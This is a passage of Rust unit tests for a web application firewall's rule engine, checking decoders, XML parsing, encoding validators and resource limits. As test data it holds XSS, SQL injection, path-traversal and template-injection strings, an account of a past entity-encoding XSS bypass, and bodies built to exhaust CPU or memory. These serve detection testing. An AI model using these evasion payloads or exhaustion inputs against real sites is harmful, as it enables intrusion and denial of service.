        let views = RequestViews::new(&uses);
        // A plain read alone does not keep the raw body.
        views.load(&TargetSpec::RequestBody, &c, None).unwrap();
        assert_eq!(views.memo_bytes.get(), 0);
        let a = views
            .load_transformed(&TargetSpec::RequestBody, &lower, &c)
            .unwrap();
        let b = views
            .load_transformed(&TargetSpec::RequestBody, &decode, &c)
            .unwrap();
        let plain = views.load(&TargetSpec::RequestBody, &c, None).unwrap();
        assert!(Rc::ptr_eq(&a, &b) && Rc::ptr_eq(&a, &plain));
        assert_eq!(views.memo_bytes.get(), held_size(&a));
    }

    /// `memo_uses` counts what `evaluate` memoizes: a target per read, a chain
    /// per rule that applies it, a `&TARGET` count as a read of the target —
    /// and nothing for multiMatch chains or VM state.
    #[test]
    fn memo_uses_counts_reads_per_target_and_chain() {
        let rs = ruleset(
            r#"
SecRule ARGS "@rx a" "id:1,phase:2,pass,t:none,t:urlDecodeUni"
SecRule ARGS "@rx b" "id:2,phase:2,pass,t:none,t:urlDecodeUni"
SecRule ARGS|ARGS_NAMES "@rx c" "id:3,phase:2,pass,t:none,t:lowercase"
SecRule ARGS "@rx d" "id:4,phase:2,pass,t:none,t:urlDecodeUni,multiMatch"
SecRule &ARGS "@gt 5" "id:5,phase:2,pass"
SecRule TX:x "@rx e" "id:6,phase:2,pass,t:lowercase"
"#,
        );
        let uses = &rs.memo_uses[Phase::RequestBody as usize];
        let n = |spec: TargetSpec, chain: &[Transform]| uses.get(&key(spec, chain)).copied();
        assert_eq!(n(TargetSpec::Args, &[]), Some(5));
        assert_eq!(n(TargetSpec::Args, &[Transform::UrlDecodeUni]), Some(2));
        assert_eq!(n(TargetSpec::Args, &[Transform::Lowercase]), Some(1));
        assert_eq!(n(TargetSpec::ArgsNames, &[Transform::Lowercase]), Some(1));
        assert!(
            uses.keys()
                .all(|(spec, _)| !matches!(spec, TargetSpec::TxVar(_))),
            "VM state is never memoized: {uses:?}"
        );
    }

    /// TX variables change DURING a call — a `setvar` is read by the rules after
    /// it — so they must never be served from the target memo. Rule 1 reads the
    /// variable before it exists; rule 3 must see the value rule 2 wrote.
    #[test]
    fn tx_targets_are_read_fresh_after_a_setvar() {
        let rs = ruleset(
            r#"
SecRule TX:flag "@streq on" "id:1,phase:2,pass,msg:'read before the setvar'"
SecRule &TX:flag "@eq 1" "id:2,phase:2,pass,msg:'counted before the setvar'"
SecRule REQUEST_METHOD "@rx ." "id:3,phase:2,pass,nolog,setvar:tx.flag=on"
SecRule TX:flag "@streq on" "id:4,phase:2,pass,msg:'read after the setvar'"
SecRule &TX:flag "@eq 1" "id:5,phase:2,pass,msg:'counted after the setvar'"
"#,
        );
        let mut c = post("/x?a=1", "application/json", "{}");
        evaluate(&rs, &mut c, Phase::RequestBody, 0);
        let fired: Vec<&str> = c.rule_matches.iter().map(|m| m.rule_id.as_str()).collect();
        assert!(
            !fired.contains(&"1") && !fired.contains(&"2"),
            "fired: {fired:?}"
        );
        assert!(
            fired.contains(&"4") && fired.contains(&"5"),
            "a TX read after a setvar must see it, fired: {fired:?}"
        );
    }

    /// A memoized target hands every rule the same values, in the same order,
    /// and a transform on one rule must not leak into the next rule's copy.
    #[test]
    fn transforms_do_not_alter_the_memoized_values() {
        let rs = ruleset(
            r#"
SecRule ARGS "@rx ^hello$" "id:1,phase:2,pass,t:lowercase,msg:'lowercased'"
SecRule ARGS "@rx ^HELLO$" "id:2,phase:2,pass,t:none,msg:'original case'"
"#,
        );
        let mut c = post("/x?q=HELLO", "application/json", "{}");
        evaluate(&rs, &mut c, Phase::RequestBody, 0);
        let fired: Vec<&str> = c.rule_matches.iter().map(|m| m.rule_id.as_str()).collect();
        assert_eq!(fired, ["1", "2"]);
    }
}

// ---------------------------------------------------------------------------
// XML / SOAP body extraction tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod xml_tests {
    use super::*;

    #[test]
    fn xml_content_type_detection() {
        assert!(is_xml_content_type("text/xml"));
        assert!(is_xml_content_type("application/xml; charset=utf-8"));
        assert!(is_xml_content_type("application/soap+xml; action=\"x\""));
        assert!(is_xml_content_type("application/rss+xml"));
        assert!(!is_xml_content_type("application/json"));
        assert!(!is_xml_content_type("text/html"));
    }

    #[test]
    fn recursive_transforms_unwrap_double_encoding() {
        // Double URL-encoding: single-pass would leave `%3Cscript`; recursive
        // decode unwraps it to `<script` so the XSS signature can match.
        assert_eq!(
            apply_transforms("%253Cscript".to_string(), &[Transform::UrlDecodeUni]),
            "<script"
        );
        // Nested numeric HTML entity: &#38; -> `&`, then &#60; -> `<`.
        assert_eq!(
            apply_transforms("&#38;#60;".to_string(), &[Transform::HtmlEntityDecode]),
            "<"
        );
        // Single-encoding still decodes; benign text stabilises after one pass.
        assert_eq!(
            apply_transforms("%3Cb%3E".to_string(), &[Transform::UrlDecodeUni]),
            "<b>"
        );
        assert_eq!(
            apply_transforms("hello world".to_string(), &[Transform::UrlDecodeUni]),
            "hello world"
        );
    }

    /// The named-entity table held six entries, and that gap was a live XSS
    /// bypass: `&gt; src onerror=confirm&amp;lpar;1&amp;rpar;&lt;` reached the
    /// application with a 200 while the same payload spelled with literal
    /// brackets was a 403. A browser resolves `&amp;lpar;` to `&lpar;` to `(`
    /// and executes it; the decoder stopped at `&lpar;`, so every XSS rule
    /// downstream saw a string containing no parentheses at all.
    #[test]
    fn html_entity_decode_covers_punctuation_used_for_evasion() {
        let d = |s: &str| apply_transforms(s.to_string(), &[Transform::HtmlEntityDecode]);

        // The pair that made the bypass work.
        assert_eq!(d("&lpar;"), "(");
        assert_eq!(d("&rpar;"), ")");
        // Doubly-wrapped, which is how it actually arrived. to_fixpoint unwraps
        // `&amp;lpar;` -> `&lpar;` -> `(`.
        assert_eq!(d("&amp;lpar;1&amp;rpar;"), "(1)");
        // The whole payload must end up syntactically executable.
        assert_eq!(
            d("&gt; src onerror=confirm&amp;lpar;1&amp;rpar;&lt;"),
            "> src onerror=confirm(1)<"
        );

        // The rest of the punctuation an evasion can hide behind.
        assert_eq!(d("&sol;etc&sol;passwd"), "/etc/passwd");
        assert_eq!(d("&lcub;&lcub;7&ast;7&rcub;&rcub;"), "{{7*7}}");
        assert_eq!(
            d("javascript&colon;alert&lpar;1&rpar;"),
            "javascript:alert(1)"
        );
        assert_eq!(d("a&semi;b&num;c&excl;d"), "a;b#c!d");
        assert_eq!(d("&lsqb;0&rsqb;"), "[0]");
        assert_eq!(d("&bsol;u0041"), "\\u0041");
        assert_eq!(d("&grave;id&grave;"), "`id`");
        assert_eq!(d("a&verbar;&verbar;b"), "a||b");
        assert_eq!(d("&dollar;&lcub;x&rcub;"), "${x}");

        // The original six still work.
        assert_eq!(d("&lt;script&gt;"), "<script>");
        assert_eq!(d("&quot;x&quot;"), "\"x\"");
        assert_eq!(d("&apos;"), "'");
        assert_eq!(d("a&nbsp;b"), "a b");

        // Names that share a prefix must not shadow each other: `&comma;` is
        // not a prefix of `&commat;`, and a list ordered wrongly would decode
        // `&commat;` as "," followed by a stray "t;".
        assert_eq!(d("&comma;"), ",");
        assert_eq!(d("&commat;"), "@");
        assert_eq!(d("&num;"), "#");
        assert_eq!(d("&nbsp;"), " ");
        assert_eq!(d("&ast;"), "*");
        assert_eq!(d("&amp;"), "&");
        assert_eq!(d("&apos;"), "'");

        // An unknown entity is left alone rather than mangled.
        assert_eq!(d("&notarealentity;"), "&notarealentity;");
        // Text with no entities is untouched.
        assert_eq!(d("plain text, no entities"), "plain text, no entities");
    }

    #[test]
    fn xml_extracts_element_text_and_attributes() {
        let body = br#"<order id="42"><item cat="books">' OR 1=1--</item></order>"#;
        let pairs = parse_xml_args(body, ArgBudget::UNLIMITED).unwrap();
        assert!(
            pairs.iter().any(|(k, v)| k == "id" && v == "42"),
            "attribute value must be surfaced: {pairs:?}"
        );
        assert!(pairs.iter().any(|(k, v)| k == "cat" && v == "books"));
        assert!(
            pairs.iter().any(|(k, v)| k == "item" && v == "' OR 1=1--"),
            "element text keyed by local element name: {pairs:?}"
        );
    }

    #[test]
    fn xml_decodes_entities_and_cdata() {
        let body = br#"<a>&lt;script&gt;</a><b><![CDATA[<xss>alert(1)</xss>]]></b>"#;
        let pairs = parse_xml_args(body, ArgBudget::UNLIMITED).unwrap();
        assert!(
            pairs.iter().any(|(_, v)| v == "<script>"),
            "entities decoded: {pairs:?}"
        );
        assert!(
            pairs.iter().any(|(_, v)| v == "<xss>alert(1)</xss>"),
            "CDATA content surfaced raw: {pairs:?}"
        );
    }

    #[test]
    fn xml_strips_namespace_prefixes_soap() {
        let body =
            br#"<soap:Envelope><soap:Body><q>select * from users</q></soap:Body></soap:Envelope>"#;
        let pairs = parse_xml_args(body, ArgBudget::UNLIMITED).unwrap();
        assert!(
            pairs
                .iter()
                .any(|(k, v)| k == "q" && v == "select * from users"),
            "namespace prefix stripped to local name: {pairs:?}"
        );
    }

    #[test]
    fn xml_ignores_comments_pi_and_doctype() {
        let body = br#"<?xml version="1.0"?><!DOCTYPE x><!-- <injected> --><root>data</root>"#;
        let pairs = parse_xml_args(body, ArgBudget::UNLIMITED).unwrap();
        assert!(pairs.iter().any(|(k, v)| k == "root" && v == "data"));
        assert!(
            !pairs.iter().any(|(_, v)| v.contains("injected")),
            "comment content must not leak into ARGS: {pairs:?}"
        );
    }

    #[test]
    fn xml_entity_decoding_numeric_and_unknown() {
        assert_eq!(decode_xml_entities("&#60;&#x3E;"), "<>");
        assert_eq!(decode_xml_entities("a &amp; b"), "a & b");
        assert_eq!(decode_xml_entities("no entities here"), "no entities here");
        // Unknown entities are preserved verbatim (fail open, don't drop data).
        assert_eq!(decode_xml_entities("&bogus;x"), "&bogus;x");
    }

    #[test]
    fn xml_malformed_fails_open() {
        // Unterminated tag / truncated body must not panic and should still
        // surface whatever text it can.
        let pairs = parse_xml_args(b"<a>hello", ArgBudget::UNLIMITED).unwrap();
        assert!(pairs.iter().any(|(k, v)| k == "a" && v == "hello"));
        let _ = parse_xml_args(b"<a href=\"unterminated", ArgBudget::UNLIMITED).unwrap();
        let _ = parse_xml_args(b"<![CDATA[unterminated", ArgBudget::UNLIMITED).unwrap();
    }
}

/// `@validateUrlEncoding` and `@validateUtf8Encoding`.
///
/// Both back CRS rules that were compiled to `Never` — present in the ruleset,
/// counted as loaded, unable to match. The malformed cases below are the reason
/// the operators exist; the well-formed ones guard the other direction, because a
/// protocol validator that fires on ordinary traffic is worse than a missing one.
#[cfg(test)]
mod encoding_validator_tests {
    use super::*;

    #[test]
    fn url_encoding_validator_accepts_well_formed_input() {
        for ok in [
            "",
            "plain",
            "%41",
            "%41%42%43",
            "a%2Fb",
            "%ff",
            "%FF",
            "no-percent-at-all/path?x=1",
            // '+' is a space in form encoding, not an escape, and is not abuse.
            "a+b",
        ] {
            assert!(
                !has_invalid_url_encoding(ok),
                "{ok:?} is valid percent-encoding but was flagged"
            );
        }
    }

    #[test]
    fn url_encoding_validator_rejects_malformed_input() {
        for bad in [
            "%",              // bare percent
            "%2",             // one hex digit then end
            "%zz",            // non-hex
            "%2z",            // second digit non-hex
            "%z2",            // first digit non-hex
            "a%",             // truncated at end of a longer value
            "a%4",            // truncated at end of a longer value
            "ok%41%",         // valid escape followed by a bare percent
            "%%3cscript%%3e", // doubled percent, the classic evasion shape
        ] {
            assert!(
                has_invalid_url_encoding(bad),
                "{bad:?} is malformed percent-encoding and should have been flagged"
            );
        }
    }

    #[test]
    fn utf8_validator_rejects_overlong_and_surrogate_forms() {
        // These are the sequences the operator exists for: each decodes to a
        // character a naive ASCII comparison never sees.
        for bad in [
            "%c0%af",       // overlong '/'
            "%e0%80%80",    // overlong NUL
            "%ed%a0%80",    // UTF-16 surrogate half
            "%f0%80%80%80", // overlong, 4-byte form
            "%ff",          // invalid lead byte
            "%c3",          // truncated 2-byte sequence
            "/etc%c0%afpasswd",
        ] {
            assert!(
                has_invalid_utf8_encoding(bad),
                "{bad:?} decodes to invalid UTF-8 and should have been flagged"
            );
        }
    }

    #[test]
    fn utf8_validator_accepts_valid_encodings() {
        for ok in [
            "",
            "plain-ascii",
            "%41%42",
            "%c3%a9",       // é, correctly encoded
            "%e2%82%ac",    // €
            "%f0%9f%92%a9", // 4-byte emoji
            "café",         // already-decoded valid UTF-8
            "%zz",          // malformed ESCAPE, not malformed UTF-8 — 920220's job
        ] {
            assert!(
                !has_invalid_utf8_encoding(ok),
                "{ok:?} is valid UTF-8 but was flagged"
            );
        }
    }

    /// The documented approximation, asserted so it stays deliberate: a value
    /// that already went through `decode_utf8_lossy` keeps only U+FFFD, and that
    /// residue is what makes the operator work on `ARGS` at all.
    #[test]
    fn utf8_validator_treats_lossy_decode_residue_as_invalid() {
        let lossy = percent_decode("%e0%80%80");
        assert!(
            lossy.contains('\u{FFFD}'),
            "expected the lossy decoder to leave U+FFFD, got {lossy:?}"
        );
        assert!(
            has_invalid_utf8_encoding(&lossy),
            "an ARGS value whose bytes were already destroyed by the lossy decoder \
             must still be detectable, or the operator is inert for the targets \
             CRS 920250 names"
        );
    }
}

// ---------------------------------------------------------------------------
// Transform correctness and cost tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod transform_tests {
    use super::*;
    use std::collections::HashSet;
    use std::sync::mpsc;
    use std::time::Duration;

    /// About 1 MB: a tenth of the default `max_body_size`, so well within what
    /// any client can make the engine inspect.
    const MB: usize = 1 << 20;

    /// Generous for linear work on 1 MB at the test profile's opt-level (each
    /// case takes milliseconds); the quadratic versions took seconds to minutes.
    const BOUND: Duration = Duration::from_secs(2);

    /// `unit` repeated to about 1 MB.
    fn mb_of(unit: &str) -> String {
        unit.repeat(MB / unit.len())
    }

    /// Whether `f`, run on a worker thread, finishes within `BOUND`. Waiting on
    /// a channel rather than joining means a quadratic regression fails in
    /// seconds instead of hanging the suite until it completes.
    fn finishes_in_time(f: impl FnOnce() + Send + 'static) -> bool {
        within(BOUND, f).is_some()
    }

    /// `f`'s result, if it arrives within `bound`.
    fn within<T: Send + 'static>(
        bound: Duration,
        f: impl FnOnce() -> T + Send + 'static,
    ) -> Option<T> {
        let (tx, rx) = mpsc::channel();
        std::thread::spawn(move || {
            let _ = tx.send(f());
        });
        rx.recv_timeout(bound).ok()
    }

    /// Every `Transform` variant, read off the type itself: asked for a
    /// variant that does not exist, serde's error names all of them. A
    /// hand-kept list compiled just as happily with a new variant left out,
    /// and that variant then never ran here.
    fn all_transforms() -> Vec<Transform> {
        let err = serde_json::from_str::<Transform>("\"__\"")
            .expect_err("`__` is not a transform")
            .to_string();
        let (_, listed) = err
            .split_once("expected one of")
            .unwrap_or_else(|| panic!("serde's error no longer lists the variants: {err}"));
        // "`A`, `B`, … at line 1 column 4": every other piece is a name.
        let all: Vec<Transform> = listed
            .split('`')
            .skip(1)
            .step_by(2)
            .map(|name| serde_json::from_str(&format!("\"{name}\"")).expect(name))
            .collect();
        // A message that parsed into a stub would pass every check below.
        assert!(
            all.len() >= 23,
            "only {} transforms read from {err}",
            all.len()
        );
        all
    }

    /// Inputs that drive each transform down its escape / rescan path as often
    /// as 1 MB allows. The match is exhaustive on purpose: a new transform has
    /// to name its own worst case, and `all_transforms` makes sure it runs.
    fn worst_cases(t: &Transform) -> Vec<String> {
        match t {
            Transform::UrlDecodeUni => vec![
                mb_of("%41"),
                mb_of("%u0041"),
                mb_of("%"),
                mb_of("%C3%A9é"),
                mb_of("%2541"),
            ],
            Transform::HtmlEntityDecode => vec![
                mb_of("&amp;"),
                mb_of("&#x41;"),
                mb_of("&"),
                format!("&#{}", "0".repeat(MB)),
            ],
            Transform::JsDecode => vec![mb_of("\\u0041\\x41\\n"), mb_of("\\")],
            Transform::CssDecode => vec![mb_of("\\41 "), mb_of("\\")],
            Transform::EscapeSeqDecode => vec![mb_of("\\x41\\101\\n"), mb_of("\\")],
            Transform::CmdLine => vec![mb_of("a ;\\\"^' /(,")],
            Transform::RemoveComments | Transform::ReplaceComments => {
                vec![mb_of("/**/"), mb_of("x/**/"), mb_of("//**/*"), mb_of("/*")]
            }
            Transform::RemoveCommentsChar => vec![mb_of("/**///")],
            Transform::RemoveWhitespace | Transform::CompressWhitespace => {
                vec![mb_of(" \t\n")]
            }
            Transform::Trim | Transform::TrimLeft | Transform::TrimRight => {
                vec![mb_of(" "), mb_of(" a ")]
            }
            Transform::NormalisePath | Transform::NormalisePathWin => {
                vec![mb_of("../a/./"), mb_of("a//"), mb_of("..\\a\\.\\")]
            }
            Transform::Base64Decode => vec![mb_of("QUJD"), format!("/{}", mb_of("QUJD"))],
            Transform::HexDecode => vec![mb_of("41")],
            Transform::Utf8ToUnicode => vec![mb_of("é€a")],
            Transform::Lowercase
            | Transform::RemoveNulls
            | Transform::ReplaceNulls
            | Transform::Length => vec![mb_of("A\0")],
        }
    }

    /// The transforms run on every inspected value, so one that is not linear
    /// in its input is a CPU-exhaustion lever for whoever sends the request.
    /// `t:urlDecodeUni` re-decoded the rest of the value for every `%`, and
    /// `t:removeComments` / `t:replaceComments` rebuilt it for every comment.
    #[test]
    fn every_transform_is_linear_on_a_megabyte() {
        let mut slow = Vec::new();
        for t in all_transforms() {
            for (case, input) in worst_cases(&t).into_iter().enumerate() {
                let tr = t.clone();
                if !finishes_in_time(move || drop(apply_single_transform(input, &tr))) {
                    slow.push(format!("{t:?} case {case}"));
                }
            }
        }
        assert!(
            slow.is_empty(),
            "over {BOUND:?} on ~1 MB, i.e. not linear in input length: {slow:?}"
        );
    }

    /// `%XX` is a BYTE and `%uXXXX` a code point; the text is formed once, at
    /// the end, so a character is never split between two escapes or misread.
    #[test]
    fn url_decode_uni_keeps_multibyte_utf8() {
        let d = url_decode_uni;
        // Escaped multi-byte characters: one `é`, not `é` plus U+FFFD.
        assert_eq!(d("caf%C3%A9"), "café");
        assert_eq!(d("%E2%82%AC"), "€");
        assert_eq!(d("%F0%9F%98%80"), "😀");
        // Raw multi-byte text beside an escape is copied, not read as Latin-1
        // (`é` came out as `Ã©` whenever the value also held a `%`).
        assert_eq!(d("café%20au%20lait"), "café au lait");
        assert_eq!(d("日本%2F語"), "日本/語");
        // %uXXXX in either case, encoded as UTF-8.
        assert_eq!(d("%u00e9%U20AC"), "é€");
        assert_eq!(d("%u003Cscript%u003E"), "<script>");
        // Malformed escapes stay literal; a lone surrogate is not a character.
        assert_eq!(d("100%"), "100%");
        assert_eq!(d("%zz%4"), "%zz%4");
        assert_eq!(d("%u12"), "%u12");
        assert_eq!(d("%uD800x"), "%uD800x");
        // Bytes that are not UTF-8 become U+FFFD.
        assert_eq!(d("a%FFb"), "a\u{FFFD}b");
        assert_eq!(d("%C3"), "\u{FFFD}");
        // The recursive transform unwraps double-encoded multi-byte text.
        assert_eq!(
            apply_transforms("caf%25C3%25A9".to_string(), &[Transform::UrlDecodeUni]),
            "café"
        );
    }

    /// The pre-fix decoder, verbatim: the oracle for "an ASCII value whose
    /// `%XX` escapes are all below `%80` comes out exactly as before".
    fn old_url_decode_uni(s: &str) -> String {
        if !s.contains('%') {
            return s.to_owned();
        }
        let bytes = s.as_bytes();
        let mut out = String::with_capacity(s.len());
        let mut i = 0;
        while i < bytes.len() {
            if bytes[i] == b'%' {
                if i + 5 < bytes.len()
                    && (bytes[i + 1] == b'u' || bytes[i + 1] == b'U')
                    && bytes[i + 2..i + 6].iter().all(|b| b.is_ascii_hexdigit())
                {
                    let hex = std::str::from_utf8(&bytes[i + 2..i + 6]).unwrap_or("0000");
                    if let Ok(n) = u32::from_str_radix(hex, 16) {
                        if let Some(ch) = char::from_u32(n) {
                            out.push(ch);
                            i += 6;
                            continue;
                        }
                    }
                }
                out.push_str(
                    &percent_encoding::percent_decode_str(&s[i..])
                        .decode_utf8_lossy()
                        .chars()
                        .take(1)
                        .collect::<String>(),
                );
                if i + 2 < bytes.len()
                    && bytes[i + 1].is_ascii_hexdigit()
                    && bytes[i + 2].is_ascii_hexdigit()
                {
                    i += 3;
                } else {
                    out.pop();
                    out.push(bytes[i] as char);
                    i += 1;
                }
            } else {
                out.push(bytes[i] as char);
                i += 1;
            }
        }
        out
    }

    /// The pre-fix comment loops, verbatim: oracles for the one-pass versions.
    fn old_remove_sql_comments(mut s: String) -> String {
        while let Some(start) = s.find("/*") {
            let end = match s[start + 2..].find("*/") {
                Some(i) => start + 2 + i + 2,
                None => break,
            };
            s = format!("{}{}", &s[..start], &s[end..]);
        }
        s
    }

    fn old_replace_sql_comments(mut s: String) -> String {
        while let Some(start) = s.find("/*") {
            let end = match s[start + 2..].find("*/") {
                Some(i) => start + 2 + i + 2,
                None => break,
            };
            s = format!("{} {}", &s[..start], &s[end..]);
        }
        s
    }

    /// Every string of length `0..=max` over `alphabet`.
    fn all_strings(alphabet: &[char], max: usize) -> Vec<String> {
        let mut layer = vec![String::new()];
        let mut all = layer.clone();
        for _ in 0..max {
            layer = layer
                .iter()
                .flat_map(|p| alphabet.iter().map(move |c| format!("{p}{c}")))
                .collect();
            all.extend(layer.iter().cloned());
        }
        all
    }

    #[test]
    fn url_decode_uni_is_unchanged_on_ascii_input_and_escapes() {
        // ASCII input only, and hex digits 0/4/7 keep every `%XX` below 0x80,
        // where the old decoder was right; `u`/`U` reach the %uXXXX path, `%`
        // the malformed ones. Not ASCII input alone: `%C3%A9` is ASCII and the
        // old decoder still gave `é` plus a stray U+FFFD.
        for s in all_strings(&['%', 'u', 'U', '0', '4', '7'], 7) {
            assert_eq!(url_decode_uni(&s), old_url_decode_uni(&s), "input {s:?}");
        }
    }

    #[test]
    fn comment_transforms_match_the_rescan_loop() {
        let rm = |s: &str| remove_sql_comments(s.to_owned());
        let rp = |s: &str| replace_sql_comments(s.to_owned());
        assert_eq!(rm("UNION/**/SELECT"), "UNIONSELECT");
        assert_eq!(rp("UNION/**/SELECT"), "UNION SELECT");
        assert_eq!(rm("é/*x*/ü"), "éü");
        // Unterminated: everything from the open comment on is kept.
        assert_eq!(rm("a/**/b/*c"), "ab/*c");
        assert_eq!(rp("a/**/b/*c"), "a b/*c");
        // Deleting a comment can join `/` and `*` into a new opener, which the
        // rescan then deleted too. A space in between cannot form one.
        assert_eq!(rm("//**/*x*/"), "");
        assert_eq!(rp("//**/*x*/"), "/ *x*/");
        // Exhaustive over the characters that decide it.
        for s in all_strings(&['/', '*', 'x'], 10) {
            assert_eq!(rm(&s), old_remove_sql_comments(s.clone()), "remove {s:?}");
            assert_eq!(rp(&s), old_replace_sql_comments(s.clone()), "replace {s:?}");
        }
    }

    /// XML bodies feed `ARGS`, and every `&` used to search for `;` to the end
    /// of the value: quadratic on a body of `&` with no `;`.
    #[test]
    fn xml_entity_decoding_is_linear() {
        // An `&` with another `&` before any `;` is literal, as it always was.
        assert_eq!(decode_xml_entities("a & b &lt; c"), "a & b < c");
        assert_eq!(decode_xml_entities("&a&lt;"), "&a<");
        assert_eq!(decode_xml_entities("&#60&gt;"), "&#60>");
        assert_eq!(decode_xml_entities("&&&;"), "&&&;");

        let text = format!("<a>{}</a>", "&".repeat(MB));
        let attr = format!("<a v=\"{}\"/>", mb_of("&x"));
        for body in [text, attr] {
            assert!(
                finishes_in_time(move || drop(
                    parse_xml_args(body.as_bytes(), ArgBudget::UNLIMITED).unwrap()
                )),
                "XML entity decoding took over {BOUND:?} on ~1 MB"
            );
        }
    }

    // -- Body extraction: names repeated per value ---------------------------

    /// A request whose body is `body`, sent as `content_type`.
    fn body_ctx(content_type: &str, body: Vec<u8>) -> RequestContext {
        let mut ctx = RequestContext::new(std::net::IpAddr::V4(std::net::Ipv4Addr::LOCALHOST), 1);
        ctx.uri = "/submit".parse().unwrap();
        ctx.request_headers
            .insert("content-type", content_type.parse().unwrap());
        ctx.request_body = Some(body.into());
        ctx
    }

    /// The body's parameters, for a body within budget.
    fn args(ctx: &RequestContext) -> Params {
        match body_parser(&content_type(ctx)) {
            BodyParser::Multipart => multipart_parts(ctx, ArgBudget::UNLIMITED).unwrap().fields,
            parser => body_args(ctx, parser, ArgBudget::UNLIMITED).expect("within the name budget"),
        }
    }

    /// Bytes of name text actually held: each allocation once, however many
    /// values share it. A name copied per value counts once per copy.
    fn name_bytes<'a, N: AsRef<str> + 'a>(names: impl IntoIterator<Item = &'a N>) -> usize {
        let mut seen = HashSet::new();
        names
            .into_iter()
            .map(|n| n.as_ref())
            .filter(|n| seen.insert(n.as_ptr() as usize))
            .map(str::len)
            .sum()
    }

    /// Bodies about `size` bytes long in which ONE name carries many values:
    /// half the body is the name, half the values under it.
    fn shared_name_bodies(size: usize) -> Vec<(&'static str, &'static str, Vec<u8>)> {
        let half = size / 2;
        let key = "k".repeat(half);
        let multipart = format!(
            "--B\r\nContent-Disposition: form-data; name=\"{key}\"\r\n{}\r\nv\r\n--B--\r\n",
            "X: y\r\n".repeat(half / 6)
        );
        vec![
            (
                "JSON array",
                "application/json",
                format!("{{\"{key}\":[{}0]}}", "0,".repeat(half / 2)),
            ),
            (
                "JSON objects in an array",
                "application/json",
                format!("{{\"{key}\":[{}{{}}]}}", "{\"a\":0},".repeat(half / 8)),
            ),
            (
                "XML text between comments",
                "application/xml",
                format!("<{key}>{}", "x<!---->".repeat(half / 8)),
            ),
            (
                "XML CDATA sections",
                "text/xml",
                format!("<{key}>{}", "<![CDATA[x]]>".repeat(half / 13)),
            ),
            (
                "multipart header lines",
                "multipart/form-data; boundary=B",
                multipart,
            ),
        ]
        .into_iter()
        .map(|(what, ct, body)| (what, ct, body.into_bytes()))
        .collect()
    }

    /// Every extractor and every consumer that walks the names, on one body:
    /// the name bytes each one holds.
    fn names_held(ct: &str, body: Vec<u8>) -> [usize; 4] {
        let ctx = body_ctx(ct, body);
        let views = RequestViews::default();
        let pairs = args(&ctx);
        let part_headers = multipart_parts(&ctx, ArgBudget::UNLIMITED)
            .unwrap()
            .part_headers;
        let listed = extract_target(&TargetSpec::ArgsNames, &ctx, &views, None).unwrap();
        let values = RequestValues::from_ctx(&ctx);
        drop(collect_sensitive_values(&ctx, &views));
        [
            name_bytes(pairs.names.iter()),
            name_bytes(part_headers.iter().map(|(k, _)| k)),
            name_bytes(listed.iter()),
            name_bytes(values.entries.iter().map(|(_, label, _)| label))
                + name_bytes(values.entries.iter().map(|(_, _, v)| v)),
        ]
    }

    /// A name used to be copied once per value it carried — by the JSON, XML
    /// and multipart extractors and again by ARGS_NAMES, the match locator and
    /// the redaction pass — so a body made of one long name and many short
    /// values held name bytes in proportion to their PRODUCT: 256 MB from a
    /// 48 KB JSON body, about 128 GB from 1 MB, an allocation abort that
    /// panic isolation cannot catch.
    #[test]
    fn a_name_shared_by_many_values_is_held_once() {
        // 16 KB first: small enough that the per-value copies stay in the tens
        // of megabytes, so the old code fails here instead of exhausting memory
        // on the megabyte below.
        for size in [16 * 1024, MB] {
            for (what, ct, body) in shared_name_bodies(size) {
                let len = body.len();
                // Five extractions of the same body (~0.5 s for a megabyte
                // here), hence five bounds.
                let bound = 5 * BOUND;
                let held = within(bound, move || names_held(ct, body))
                    .unwrap_or_else(|| panic!("{what}: over {bound:?} on {len} bytes"));
                // Values and the raw body are listed too; names alone stay
                // within a couple of body lengths.
                for (n, bytes) in held.into_iter().enumerate() {
                    assert!(
                        bytes <= 2 * len,
                        "{what} ({len} bytes): consumer {n} held {bytes} bytes of names"
                    );
                }
            }
        }
    }

    /// Sharing cannot help when every name is DIFFERENT: a JSON key spelled out
    /// again as the prefix of each of its many child keys. Listing them all
    /// grows with the square of the body, and listing only some would pass
    /// the rest uninspected, so the body is refused instead.
    #[test]
    fn json_names_past_the_budget_refuse_the_request() {
        let distinct_children = |size: usize| {
            let key = "k".repeat(size / 2);
            let kids: Vec<String> = (0..size / 20).map(|i| format!("\"a{i}\":0")).collect();
            format!("{{\"{key}\":{{{}}}}}", kids.join(",")).into_bytes()
        };
        for size in [16 * 1024, MB] {
            let body = distinct_children(size);
            let len = body.len();
            let over = within(BOUND, move || {
                let ctx = body_ctx("application/json", body);
                match body_args(&ctx, BodyParser::Json, ArgBudget::UNLIMITED) {
                    Err(Unlisted::BodyTooComplex) => None,
                    Err(other) => panic!("no limits were set, yet {other:?}"),
                    Ok(pairs) => Some(name_bytes(pairs.names.iter())),
                }
            })
            .unwrap_or_else(|| panic!("over {BOUND:?} on {len} bytes"));
            assert_eq!(
                over, None,
                "{len}-byte body extracted names past the budget"
            );
        }

        // The engine refuses it; in learning mode the proxy logs that as a
        // would-block, as it does every Block.
        let engine = crate::RuleEngine::from_crs_conf(
            "SecRule ARGS \"@rx never-present\" \"id:1,phase:2,deny\"",
        )
        .unwrap();
        let mut ctx = body_ctx("application/json", distinct_children(64 * 1024));
        let decision = engine.evaluate(&mut ctx, Phase::RequestBody, 0);
        assert_eq!(decision, WafDecision::Block);
        assert_eq!(ctx.block_reason.as_deref(), Some(BODY_TOO_COMPLEX));

        // A deep, ordinary document is nowhere near the limit: five levels of
        // ordinary keys over 500 objects, 1,500 distinct leaves.
        let services: Vec<String> = (0..500)
            .map(|i| format!("\"svc{i}\":{{\"replicas\":2,\"image\":\"app:1.4\",\"port\":8080}}"))
            .collect();
        let doc = format!(
            "{{\"application\":{{\"environment\":{{\"production\":{{\"services\":{{{}}}}}}}}}}}",
            services.join(",")
        );
        let mut ctx = body_ctx("application/json", doc.into_bytes());
        let pairs = args(&ctx);
        assert_eq!(pairs.len(), 1500);
        assert!(pairs.iter().any(|(k, v)| k
            == "application.environment.production.services.svc499.port"
            && v == "8080"));
        assert_eq!(
            engine.evaluate(&mut ctx, Phase::RequestBody, 0),
            WafDecision::Allow
        );
    }

    /// What sharing changes, and what it must not.
    #[test]
    fn a_shared_name_is_listed_once_and_counted_every_time() {
        let mut ctx = body_ctx(
            "application/json",
            br#"{"a":["v1","v2","v3"],"b":{"c":"x"},"password":["s3cret-one","s3cret-two"]}"#
                .to_vec(),
        );
